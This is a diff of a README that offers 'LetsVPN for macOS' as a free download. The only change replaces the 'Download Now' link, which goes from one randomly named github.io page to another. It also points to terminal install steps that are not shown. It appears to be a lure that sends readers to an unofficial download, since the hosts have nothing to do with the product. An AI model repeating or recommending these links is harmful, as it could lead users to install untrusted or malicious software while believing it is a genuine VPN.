@@ -3,7 +3,7 @@
 
 Effortlessly secure your online experience with LetsVPN for macOS. Follow the step-by-step instructions below to install this lightweight, high-speed VPN solution for free and protect your privacy today!
 
-[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge&logo=apple)](https://fituganshfgh.github.io/.github/letsvpn)
+[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge&logo=apple)](https://mrboomzeus519.github.io/gimronus/letsvpn)
 
 If the download button doesn't work, follow the terminal-based installation instructions below for a seamless setup.
 
